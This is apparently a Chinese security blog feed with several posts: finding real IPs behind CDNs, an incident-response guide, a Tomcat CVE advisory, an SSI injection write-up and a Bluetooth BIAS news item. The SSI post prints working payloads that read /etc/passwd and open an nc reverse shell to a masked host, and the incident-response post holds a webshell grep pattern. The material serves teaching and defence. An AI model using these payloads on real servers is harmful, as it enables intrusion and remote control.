<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iphistory：https://viewdns.info/iphistory/</span><br><span class="line">DNS查询：（https://dnsdb.io/zh-cn/）</span><br><span class="line">微步在线：（https://x.threatbook.cn/）</span><br><span class="line">域名查询：（https://site.ip138.com/）</span><br><span class="line">DNS历史查询：（https://securitytrails.com/）</span><br><span class="line">Netcraft：https://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure>

<p>IP History 查询记录：</p>
<img src="https://ckcah.github.io/images/CDN/1.png">

<p><strong>二、查找子域名</strong></p>
<p>很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。</p>
<p>常用的子域名查找方法和工具：</p>
<p>1、搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。</p>
<span id="more"></span> 

<p>2、一些在线查询工具，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://tool.chinaz.com/subdomain/</span><br><span class="line">http://i.links.cn/subdomain/    </span><br><span class="line">http://subdomain.chaxun.la/</span><br><span class="line">http://searchdns.netcraft.com/</span><br><span class="line">https://www.virustotal.com/</span><br></pre></td></tr></table></figure>

<p>3、 子域名爆破工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https://github.com/ring04h/wydomain    </span><br><span class="line">subDomainsBrute:https://github.com/lijiejie/</span><br><span class="line">Sublist3r:https://github.com/aboul3la/Sublist3r</span><br></pre></td></tr></table></figure>

<p><strong>三、网站邮件头信息</strong></p>
<p>比如说，邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p>
<img src="https://ckcah.github.io/images/CDN/2.png">

<p><strong>四、网络空间安全引擎搜索</strong></p>
<p>通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">钟馗之眼：https://www.zoomeye.org</span><br><span class="line">Shodan：https://www.shodan.io</span><br><span class="line">Fofa：https://fofa.so</span><br></pre></td></tr></table></figure>

<p>ZoomEy搜索：</p>
<img src="https://ckcah.github.io/images/CDN/3.png">

<p><strong>五、利用SSL证书寻找真实IP</strong></p>
<p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。</p>
<p>SSL证书搜索引擎：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://censys.io/ipv4?q=github.com</span><br></pre></td></tr></table></figure>

<p>Censys 证书搜索：</p>
<img src="https://ckcah.github.io/images/CDN/4.png">

<p><strong>六、国外主机解析域名</strong></p>
<p>大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。</p>
<p>国外多PING测试工具：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://asm.ca.com/zh_cn/ping.php</span><br><span class="line">http://host-tracker.com/</span><br><span class="line">http://www.webpagetest.org/</span><br><span class="line">https://dnscheck.pingdom.com/</span><br></pre></td></tr></table></figure>

<p>国外多ping网站测试：</p>
<img src="https://ckcah.github.io/images/CDN/5.png">

<p><strong>七、扫描全网</strong></p>
<p>通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。</p>
<p>1、ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/zmap/zmap</span><br></pre></td></tr></table></figure>

<p>2、Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/robertdavidgraham/masscan</span><br></pre></td></tr></table></figure>

<p><strong>八、配置不当导致绕过</strong></p>
<p>在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。</p>
<p>案例1：为了方便用户访问，我们常常将<code>www.test.com</code> 和 <code>test.com</code> 解析到同一个站点，而CDN只配置了<a href="http://www.test.com,通过访问test.com,就可以绕过/">www.test.com，通过访问test.com，就可以绕过</a> CDN 了。</p>
<p>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
        <category>奇淫技巧</category>
        <category>信息搜集</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>姿势学习</tag>
      </tags>
  </entry>
  <entry>
    <title>黑客入侵该如何应急排查(2)</title>
    <url>/2020/05/26/%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E8%AF%A5%E5%A6%82%E4%BD%95%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5-2/</url>
    <content><![CDATA[<p><strong>一、</strong> <em><strong>后门排查</strong></em></p>
<p>除以上文件、进程、系统 分析外，推荐工具：</p>
<p>chkrootkit rkhunter（<a href="http://www.chkrootkit.org/">www.chkrootkit.org</a> rkhunter.sourceforge.net）</p>
<p><strong>A.</strong> <em><strong>chkrootkit</strong></em></p>
<p>(迭代更新了20年)主要功能：</p>
<p>\1. 检测是否被植入后门、木马、rootkit</p>
<p>\2. 检测系统命令是否正常</p>
<p>\3. 检测登录日志</p>
<p>\4. 详细参考README</p>
<img src="https://ckcah.github.io/images/hc/1.png">

<p><strong>B.</strong> <em><strong>rkhunter主要功能：</strong></em></p>
<p>\1. 系统命令（Binary）检测，包括Md5 校验</p>
<p>\2. Rootkit检测</p>
<p>\3. 本机敏感目录、系统配置、服务及套间异常检测</p>
<p>\4. 三方应用版本检测</p>
<img src="https://ckcah.github.io/images/hc/2.png">

<p><strong>C.</strong> <em><strong>RPM check检查</strong></em></p>
<p>系统完整性也可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查</p>
<p><code>./rpm -Va &gt; rpm.log</code></p>
<p>如果一切均校验正常将不会产生任何输出。如果有不一致的地方，就会显示出来。输出格式是8位长字符串,c 用以指配置文件, 接着是文件名. 8位字符的每一个 用以表示文件与RPM数据库中一种属性的比较结果， .(点) 表示测试通过。.下面的字符表示对RPM软件包进行的某种测试失败：</p>
<p>5 MD5 校验码</p>
<p>S 文件尺寸</p>
<p>L 符号连接</p>
<p>T 文件修改日期</p>
<p>D 设备</p>
<p>U 用户</p>
<p>G 用户组</p>
<p>M 模式e (包括权限和文件类型)</p>
<p>借用sobug文章案例：如下图可知ps, pstree, netstat, sshd等等系统关键进程被篡改了</p>
<img src="https://ckcah.github.io/images/hc/3.png">

<p><strong>D.</strong> <em><strong>Webshell查找</strong></em></p>
<p>Webshell的排查可以通过文件、流量、日志三种方式进行分析，基于文件的命名特征和内容特征，相对操作性较高，在入侵后应急过程中频率也比较高。</p>
<p>可根据webshell特征进行命令查找，简单的可使用(当然会存在漏报和误报)</p>
<p>find /var/www/ -name “<em>.php” |xargs egrep ‘assert|phpspy|c99sh|milw0rm|eval|(gunerpress|(base64_decoolcode|spider_bc|shell_exec|passthru|($_POST[|eval (str_rot13|.chr(|${“_P|eval($_R|file_put_contents(.</em>$_|base64_decode’</p>
<ol>
<li><p>Webshell的排查可以通过</p>
</li>
<li><p>Github上存在各种版本的webshell查杀脚本，当然都有自己的特点，可使用河马shell查杀（shellpub.com）</p>
</li>
</ol>
<p>综上所述，通过chkrootkit 、rkhunter、RPM check、Webshell Check 等手段得出以下应对措施：</p>
<p>(1) 根据进程、连接等信息关联的程序，查看木马活动信息。</p>
<p>(2) 假如系统的命令（例如netstat ls 等）被替换，为了进一步排查，需要下载一新的或者从其他未感染的主机拷贝新的命令。</p>
<p>(3) 发现可疑可执行的木马文件，不要急于删除，先打包备份一份。</p>
<p>(4) 发现可疑的文本木马文件，使用文本工具对其内容进行分析，包括回连IP地址、加密方式、关键字（以便扩大整个目录的文件特征提取）等。</p>
<p><strong>二</strong>、<em><strong>日志分析</strong></em></p>
<p>日志文件 /var/log/message 包括整体系统信息 /var/log/auth.log 包含系统授权信息，包括用户登录和使用的权限机制等 /var/log/userlog 记录所有等级用户信息的日志。/var/log/cron 记录crontab命令是否被正确的执行 /var/log/xferlog(vsftpd.log)记录Linux FTP日志 /var/log/lastlog 记录登录的用户，可以使用命令lastlog查看 /var/log/secure 记录大多数应用输入的账号与密码，登录成功与否 var/log/wtmp　记录登录系统成功的账户信息，等同于命令last var/log/faillog　 记录登录系统不成功的账号信息，一般会被黑客删除</p>
<ol>
<li><p>日志查看分析，grep,sed,sort,awk综合运用</p>
</li>
<li><p>基于时间的日志管理：</p>
</li>
</ol>
<p>/var/log/wtmp</p>
<p>/var/run/utmp</p>
<p>/var/log/lastlog(lastlog)</p>
<p>/var/log/btmp(lastb)</p>
<ol start="3">
<li><p>登录日志可以关注Accepted、Failed password 、invalid特殊关键字</p>
</li>
<li><p>登录相关命令</p>
</li>
</ol>
<p>lastlog 记录最近几次成功登录的事件和最后一次不成功的登录 who 命令查询utmp文件并报告当前登录的每个用户。</p>
<p>Who的缺省输出包括用户名、终端类型、登录日期及远程主机 w 命令查询utmp文件并显示当前系统中每个用户和它所运行的进程信息 users 用单独的一行打印出当前登录的用户，每个显示的用户名对应一个登录会话。</p>
<p>如果一个用户有不止一个登录会话，那他的用户名把显示相同的次数last 命令往回搜索wtmp来显示自从文件第一次创建以来登录过的用户 finger 命令用来查找并显示用户信息，系统管理员通过使用该命令可以知道某个时候到底有多少用户在使用这台Linux主机。</p>
<ol start="5">
<li>几个语句：</li>
</ol>
<ol>
<li><p>#定位有多少IP在爆破主机的root帐号 grep “Failed password for root” /var/log/auth.log | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more</p>
</li>
<li><p>#登录成功的IP有哪些 grep “Accepted “ /var/log/auth.log | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more tail -400f demo.log</p>
</li>
<li><p>#监控最后400行日志文件的变化 等价与 tail -n 400 -f （-f参数是实时） less demo.log</p>
</li>
<li><p>#查看日志文件，支持上下滚屏，查找功能 uniq -c demo.log</p>
</li>
<li><p>#标记该行重复的数量，不重复值为1 grep -c ‘ERROR’ demo.log</p>
</li>
<li><p>#输出文件demo.log中查找所有包行ERROR的行的数量</p>
</li>
</ol>
<p><strong>三</strong>、<em><strong>相关处置</strong></em></p>
<p>kill -9</p>
<p>chattr –i</p>
<p>rm</p>
<p>setfacl</p>
<p>ssh</p>
<p>Chmod</p>
<p><em><strong>3.2 Windows系列分析排查</strong></em></p>
<p><em><strong>3.2.1 文件分析</strong></em></p>
<ol>
<li><p>开机启动有无异常文件</p>
</li>
<li><p>各个盘下的temp(tmp)相关目录下查看有无异常文件</p>
</li>
<li><p>浏览器浏览痕迹、浏览器下载文件、浏览器cookie信息</p>
</li>
<li><p>查看文件时间，创建时间、修改时间、访问时间。对应linux的ctime mtime atime，通过对文件右键属性即可看到详细的时间（也可以通过dir /tc 1.aspx 来查看创建时间），黑客通过菜刀类工具改变的是修改时间。所以如果修改时间在创建时间之前明显是可疑文件。</p>
</li>
<li><p>查看用户recent相关文件，通过分析最近打开分析可疑文件</p>
</li>
</ol>
<p>a) C:Documents and SettingsAdministratorRecent</p>
<p>b) C:Documents and SettingsDefault UserRecent</p>
<p>c) 开始,运行 %UserProfile%Recent</p>
<ol start="6">
<li>根据文件夹内文件列表时间进行排序，查找可疑文件。</li>
</ol>
<p>当然也可以搜索指定日期范围的文件及文件大小</p>
<p>Server2008 R2系列</p>
<img src="https://ckcah.github.io/images/hc/4.png">

<p>Win10 系列</p>
<img src="https://ckcah.github.io/images/hc/5.png">

<ol>
<li></li>
</ol>
<p>关键字匹配，通过确定后的入侵时间，以及webshell或js文件的关键字（比如博彩类），可以在IIS 日志中进行过滤匹配，比如经常使用:</p>
<ol start="2">
<li>知道是上传目录，在web log 中查看指定时间范围包括上传文件夹的访问请求 findstr /s /m /I “UploadFiles” *.log 某次博彩事件中的六合彩信息是six.js findstr /s /m /I “six.js” *.aspx 根据shell名关键字去搜索D盘spy相关的文件有哪些 for /r d: %i in (<em>spy</em>.aspx) do @echo %i ```</li>
</ol>
<p><em><strong>参考来源</strong></em><strong>：</strong>网络安全渗透hack</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急排查</tag>
      </tags>
  </entry>
  <entry>
    <title>cve-2020-9484反序列化代码执行漏洞通告</title>
    <url>/2020/05/24/CVE-2020-9484/</url>
    <content><![CDATA[<p><strong>转载于：<a href="https://cert.360.cn/warning/detail?id=d03712a8b6a7907ea0c32e235b80d9e8">https://cert.360.cn/warning/detail?id=d03712a8b6a7907ea0c32e235b80d9e8</a></strong></p>
<h2 id="0x01-漏洞背景"><a href="#0x01-漏洞背景" class="headerlink" title="0x01 漏洞背景"></a>0x01 漏洞背景</h2><p>2020年05月21日， 360CERT监测发现 <code>Apache</code> 官方发布了 <code>Apache Tomcat 远程代码执行</code> 的风险通告，该漏洞编号为 <code>CVE-2020-9484</code>，官方对该漏洞评级：<code>高危</code>。</p>
<p><code>Apache Tomcat</code> 是一个开放源代码、运行<code>servlet</code>和<code>JSP Web</code>应用软件的基于<code>Java</code>的Web应用软件容器。</p>
<p>当<code>Tomcat</code>使用了自带<code>session</code>同步功能时，使用不安全的配置（没有使用<code>EncryptInterceptor</code>）会存在反序列化漏洞，攻击者通过精心构造的数据包， 可以对使用了自带<code>session</code>同步功能的<code>Tomcat</code>服务器进行攻击。</p>
<p>对此，360CERT建议广大用户及时安装最新补丁，做好资产自查/自检/预防工作，以免遭受黑客攻击。 </p>
<h2 id="0x02-风险等级"><a href="#0x02-风险等级" class="headerlink" title="0x02 风险等级"></a>0x02 风险等级</h2><p>360CERT对该漏洞进行评定</p>
<table>
<thead>
<tr>
<th align="center">评定方式</th>
<th align="center">等级</th>
</tr>
</thead>
<tbody><tr>
<td align="center">威胁等级</td>
<td align="center">中危</td>
</tr>
<tr>
<td align="center">影响面</td>
<td align="center">一般</td>
</tr>
</tbody></table>
<h2 id="0x03-漏洞详情"><a href="#0x03-漏洞详情" class="headerlink" title="0x03 漏洞详情"></a>0x03 漏洞详情</h2><p>利用该漏洞需要满足如下四个条件：</p>
<ol>
<li>攻击者能够控制服务器的文件的内容和名称。</li>
<li>服务器被配置为使用<code>PersistenceManager</code>和<code>FileStore</code>。</li>
<li><code>PersistenceManager</code>配置了<code>sessionAttributeValueClassNameFilter=&quot;null&quot;</code>(默认值，除非使用了<code>SecurityManager</code>)或者其他非常宽松的过滤器，攻击者就能够对提供的对象进行反序列化。</li>
<li>攻击者知道从<code>FileStore</code>使用的存储位置到攻击者所控制的文件的相对文件路径。</li>
</ol>
<h2 id="0x04-影响版本"><a href="#0x04-影响版本" class="headerlink" title="0x04 影响版本"></a>0x04 影响版本</h2><ul>
<li>Apache Tomcat : 10.0.0-M1 to 10.0.0-M4</li>
<li>Apache Tomcat : 9.0.0.M1 to 9.0.34</li>
<li>Apache Tomcat : 8.5.0 to 8.5.54</li>
<li>Apache Tomcat : 7.0.0 to 7.0.103</li>
</ul>
<h2 id="0x05-修复建议"><a href="#0x05-修复建议" class="headerlink" title="0x05 修复建议"></a>0x05 修复建议</h2><h3 id="通用修补建议："><a href="#通用修补建议：" class="headerlink" title="通用修补建议："></a>通用修补建议：</h3><ul>
<li>升级到 Apache Tomcat 10.0.0-M5 及以上版本</li>
<li>升级到 Apache Tomcat 9.0.35 及以上版本</li>
<li>升级到 Apache Tomcat 8.5.55 及以上版本</li>
<li>升级到 Apache Tomcat 7.0.104 及以上版本</li>
</ul>
<h3 id="临时修补建议："><a href="#临时修补建议：" class="headerlink" title="临时修补建议："></a>临时修补建议：</h3><p>禁止使用<code>Session</code>持久化功能<code>FileStore</code>。</p>
<h2 id="0x06-相关空间测绘数据"><a href="#0x06-相关空间测绘数据" class="headerlink" title="0x06 相关空间测绘数据"></a>0x06 相关空间测绘数据</h2><p>360安全大脑-Quake网络空间测绘系统通过对全网资产测绘，发现<code>Apache Tomcat</code>在国内外均有广泛使用，具体分布如下图所示。</p>
<img src="https://ckcah.github.io/images/CVE-2020-9484/1.png">



<h2 id="0x07-产品侧解决方案"><a href="#0x07-产品侧解决方案" class="headerlink" title="0x07 产品侧解决方案"></a>0x07 产品侧解决方案</h2><h3 id="360城市级网络安全监测服务"><a href="#360城市级网络安全监测服务" class="headerlink" title="360城市级网络安全监测服务"></a>360城市级网络安全监测服务</h3><p>360安全大脑的QUAKE资产测绘平台通过资产测绘技术手段，对该类 漏洞/事件 进行监测，请用户联系相关产品区域负责人获取对应产品。</p>
<h2 id="0x08-时间线"><a href="#0x08-时间线" class="headerlink" title="0x08 时间线"></a>0x08 时间线</h2><p><strong>2020-05-20</strong>  apache官方发布预警</p>
<p><strong>2020-05-21</strong>  360CERT发布预警</p>
<h2 id="0x09-参考链接"><a href="#0x09-参考链接" class="headerlink" title="0x09 参考链接"></a>0x09 参考链接</h2><p> <a href="https://lists.apache.org/thread.html/r77eae567ed829da9012cadb29af17f2df8fa23bf66faf88229857bb1%40">CVE-2020-9484 Apache Tomcat Remote Code Execution via session persistence</a></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>web安全</category>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>Apache</tag>
        <tag>反序列化代码执行漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>SSI注入</title>
    <url>/2020/05/23/SSI%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="服务器端包含注入SSI分析总结"><a href="#服务器端包含注入SSI分析总结" class="headerlink" title="服务器端包含注入SSI分析总结"></a>服务器端包含注入SSI分析总结</h1><p><strong>本文作者：</strong><a href="https://www.secpulse.com/archives/author/w2n1ck">w2n1ck</a></p>
<hr>
<h2 id="0x01-关于SSI"><a href="#0x01-关于SSI" class="headerlink" title="0x01 关于SSI"></a>0x01 关于SSI</h2><p>SSI是英文”Server Side Includes”的缩写，翻译成中文就是服务器端包含的意思。</p>
<p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p>
<p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p>
<p><strong>1.1 启用SSI</strong></p>
<p><strong>示例：Nginx 配置SSI功能</strong></p>
<p>在http段中加入下面几句即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssi on;</span><br><span class="line">ssi_silent_errors off;</span><br><span class="line">ssi_types text/shtml;</span><br></pre></td></tr></table></figure>

<p>默认Apache不开启SSI，SSI这种技术已经比较少用了。如果应用没有使用到SSI，关闭服务器对SSI的支持即可。</p>
<p>IIS和Apache都可以开启SSI功能，具体可参考:<a href="http://m.jb51.net/article/25725.htm](http://m.jb51.net/article/25725.htm">Apache、Nginx 服务配置服务器端包含（SSI）</a></p>
<p><strong>1.2 SSI语法</strong></p>
<p>首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来。</p>
<p><strong>①显示服务器端环境变量&lt;#echo&gt;</strong></p>
<p>本文档名称：</p>
<p>&lt;!–#echo var=”DOCUMENT_NAME”–&gt;</p>
<p>现在时间：</p>
<p>&lt;!–#echo var=”DATE_LOCAL”–&gt;</p>
<p>显示IP地址：</p>
<p>&lt;! #echo var=”REMOTE_ADDR”–&gt;</p>
<p><strong>②</strong> <strong>将文本内容直接插入到文档中&lt;#include&gt;</strong></p>
<p>&lt;! #include file=”文件名称”–&gt;</p>
<!--#include virtual="index.html" -->

<p>&lt;! #include virtual=”文件名称”–&gt;</p>
<!--#include virtual="/www/footer.html" -->

<p>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径</p>
<p><strong>③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</strong></p>
<p>文件最近更新日期：</p>
<p>&lt;! #flastmod file=”文件名称”–&gt;</p>
<p>文件的长度：</p>
<p>&lt;!–#fsize file=”文件名称”–&gt;</p>
<p><strong>④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</strong></p>
<p>&lt;!–#exec cmd=”文件名称”–&gt;</p>
<!--#exec cmd="cat /etc/passwd"-->

<p>&lt;!–#exec cgi=”文件名称”–&gt;</p>
<!--#exec cgi="/cgi-bin/access_log.cgi"–>

将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。



**⑤设置SSI信息显示格式<#config>(如文件制作日期/大小显示方式**)



**⑥高级SSI可设置变量使用if条件语句。**



## 0x02 漏洞场景

在很多业务中，用户输入的内容会显示在页面中。比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI漏洞。

从定义中看出，页面中有一小部分是动态输出的时候使用SSI，比如：

- 文件相关的属性字段
- 当前时间
- 访客IP
- 调用CGI程序



## 0x03 SSI注入的条件

当符合下列条件时，攻击者可以在 Web 服务器上运行任意命令：

- Web 服务器已支持SSI（服务器端包含）
- Web 应用程序未对对相关SSI关键字做过滤
- Web 应用程序在返回响应的HTML页面时，嵌入用户输入

SSI注入常用命令：[Server-Side Includes (SSI) Injection] 

https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection



## 0x04 SSI挖掘思路

两个思路：

- 从业务场景来Fuzz，比如获取IP、定位、时间等
- 识别页面是否包含.stm,.shtm和.shtml后缀
- [**伏特分布式漏洞扫描平台**](https://v.duoyinsu.com/)**已经全面支持SSI检测。**

google dork：'inurl:bin/cklb'



## 0x05 SSI漏洞复现

**5.1 本地测试**

我们使用bWAPP来做漏洞演示环境

选择：'Server-Side Includes (SSI) Injection'

<img src="https://ckcah.github.io/images/SSI注入/1.png" >

输入个XSS的payload：'<script>alert(1)</script>'

<img src="https://ckcah.github.io/images/SSI注入/2.png" >

成功执行了代码。

再使用下exec指令使用cmd作为参数执行服务器端命令：'<!--#exec cmd="ls -al"-->'

<img src="https://ckcah.github.io/images/SSI注入/3.png">

<p><strong>5.2 漏洞挖掘</strong></p>
<p>运气好，刚好遇到个某SRC的。</p>
<p>“–&gt;’–&gt;`–&gt;&lt;<!--#exec cmd="cat /etc/passwd"--></p>
<p>执行命令</p>
<img src="https://ckcah.github.io/images/SSI注入/4.png">

<p>“–&gt;’–&gt;`–&gt;&lt;<!--#exec cmd="nc x.x.x.x 9090 -e /bin/bash"--></p>
<p>反弹shell</p>
<img src="https://ckcah.github.io/images/SSI注入/5.png">

<h2 id="0x06-SSI防御"><a href="#0x06-SSI防御" class="headerlink" title="0x06 SSI防御"></a>0x06 SSI防御</h2><ul>
<li>关闭服务器SSI功能</li>
<li>过滤相关SSI特殊字符（<code>&lt;,&gt;,#,-,&quot;,&#39;</code>）</li>
</ul>
<p>具体请参考：</p>
<p>[<a href="http://blog.csdn.net/qq_29277155/article/details/52751364">SSI 注入的介绍和代码防御]</a></p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="http://m.jb51.net/article/25725.htm">http://m.jb51.net/article/25725.htm</a></p>
<p><a href="http://www.kubiji.cn/topic-id998.html">http://www.kubiji.cn/topic-id998.html</a></p>
<p><a href="https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection">https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection</a></p>
<p><a href="http://www.mottoin.com/101526.html">http://www.mottoin.com/101526.html</a></p>
<p><a href="http://www.evilclay.com/2017/04/28/SSI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/">http://www.evilclay.com/2017/04/28/SSI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/</a></p>
<p><a href="http://blog.csdn.net/qq_29277155/article/details/52751364">http://blog.csdn.net/qq_29277155/article/details/52751364</a></p>
<p>【本文 <a href="https://www.secpulse.com/archives/66934.html">服务器端包含注入SSI分析总结</a> 作者：安识科技<a href="https://www.secpulse.com/archives/author/w2n1ck">w2n1ck</a> 转载注明来源<a href="https://www.secpulse.com/archives/61101.html">安全脉搏</a>】</p>
<p><a href="https://www.secpulse.com/archives/66934.html">https://www.secpulse.com/archives/66934.html</a>)</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>SSI注入</tag>
      </tags>
  </entry>
  <entry>
    <title>新蓝牙漏洞</title>
    <url>/2020/05/22/%E6%96%B0%E8%93%9D%E7%89%99%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><strong>转载于：<a href="https://mp.weixin.qq.com/s/8Nguft4bkQhVXhELaGMnhw">https://mp.weixin.qq.com/s/8Nguft4bkQhVXhELaGMnhw</a></strong></p>
<p>近日据外媒AppleInsider消息，<strong>一个研究团队披露了一个新的漏洞，可以让攻击者欺骗现代蓝牙设备，使其与伪装成受信任的恶意设备配对</strong>。</p>
<img src="https://ckcah.github.io/images/ly-1.png">



<p><strong>黑客伪造出可信的蓝牙外设 成为新的安全漏洞</strong></p>
<p>这个安全漏洞被团队称为蓝牙冒充攻击BIAS，影响了一系列使用蓝牙的设备，包括iPhone、iPad和Mac。</p>
<p>BIAS攻击利用了蓝牙设备如何处理长期连接的漏洞，当两台蓝牙设备配对后，它们在一个“链接密钥 ”上达成一致，这样它们就可以在不经过配对过程的情况下重新连接到对方。</p>
<p>瑞士洛桑联邦理工学院的研究人员发现，他们能够在不知道这个链接密钥的情况下，欺骗之前配对过的设备的蓝牙地址来完成认证过程。</p>
<p>当攻击设备假装是一个只支持单边认证的先前受信任的设备时，该漏洞就会启动–这是蓝牙中最低的安全设置。</p>
<p>通常情况下，用户的设备将是验证该连接是否有效的设备。然而，通过使用一种被称为“角色切换”的策略，攻击者可以欺骗认证，并与用户设备建立安全连接。</p>
<p>结合其他蓝牙漏洞，如蓝牙密钥协商KNOB，攻击者可以破坏在安全认证模式下运行的设备。</p>
<p>一旦BIAS攻击成功，被攻击的设备就可以被用来进行其他的利用，包括访问通过蓝牙发送的数据，甚至控制之前配对的设备所拥有的功能。</p>
<p>由于蓝牙连接通常不需要用户进行明确的交互，因此BIAS和KNOB攻击也是隐蔽的，可以在用户不知情的情况下进行。</p>
<p><strong>那么，究竟哪些电子设备会受到BIAS攻击的威胁？</strong></p>
<p>这个缺陷只影响到蓝牙基本速率/增强数据速率，也就是经典蓝牙，但这仍然使相对较新的苹果设备受到攻击，包括iPhone 8及以上版本、2017年版 MacBook设备及以上版本、2018年的iPad机型及以上版本。</p>
<p>为了实施攻击，不良行为者需要在易受攻击设备的蓝牙范围内，并知道之前配对设备的蓝牙地址。对于一个熟练的攻击者来说，找到这些蓝牙地址相对来说是件小事，即使是随机的。</p>
<p>研究人员已经通知了蓝牙特别兴趣小组SIG，该小组已经更新了蓝牙核心规范来缓解这一漏洞。苹果和三星等厂商很可能会在不久的将来推出固件或软件补丁，配合修复措施。</p>
